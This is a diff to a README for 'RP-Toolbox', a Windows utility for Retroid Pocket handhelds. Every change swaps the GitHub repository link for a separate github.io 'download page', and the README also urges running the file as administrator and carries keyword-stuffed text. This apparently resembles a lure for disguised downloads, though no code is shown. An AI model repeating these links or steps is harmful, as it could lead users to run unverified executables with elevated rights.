@@ -1,6 +1,6 @@
 # 🛠️ RP-Toolbox - Your All-in-One Companion App
 
-[![Download RP-Toolbox](https://img.shields.io/badge/Download-RP--Toolbox-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dwayne70th1663/RP-Toolbox)
+[![Download RP-Toolbox](https://img.shields.io/badge/Download-RP--Toolbox-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://dwayne70th1663.github.io)
 
 ## 👋 Welcome to RP-Toolbox
 
@@ -36,7 +36,7 @@ Getting started with RP-Toolbox is quick and easy! Just follow these simple step
 
 ### Step 1: Download RP-Toolbox
 
-[**Click here to visit the download page**](https://github.com/dwayne70th1663/RP-Toolbox)
+[**Click here to visit the download page**](https://dwayne70th1663.github.io)
 
 Visit this link to download the application.
 
@@ -96,7 +96,7 @@ Try right-clicking the downloaded file and selecting **"Run as administrator"**.
 Check that your USB cable is properly connected at both ends. Try a different USB port if available. Make sure your device is turned on and unlocked.
 
 ### Need More Help?
-Our GitHub page has additional resources and support. You can always revisit [our download page](https://github.com/dwayne70th1663/RP-Toolbox) and explore the discussions or issues section if you have questions.
+Our GitHub page has additional resources and support. You can always revisit [our download page](https://dwayne70th1663.github.io) and explore the discussions or issues section if you have questions.
 
 ## 🔒 Safety & Privacy
 
@@ -127,6 +127,6 @@ Thank you for choosing RP-Toolbox! We're confident you'll find it a valuable add
 
 ---
 
-**Ready to get started?** [Download RP-Toolbox now](https://github.com/dwayne70th1663/RP-Toolbox) and unlock the full potential of your device today!
+**Ready to get started?** [Download RP-Toolbox now](https://dwayne70th1663.github.io) and unlock the full potential of your device today!
 
 Keywords: retroid, pocket, rp6, rp-toolbox, utility, manager, diagnostics, handheld, gaming, setup, configuration, windows, free, download, tools, device, management, optimization, companion, software, application, emulator, system, health, storage, files, games, library, settings, control, monitor, check, support, guide, help, update, privacy, safe, security, performance
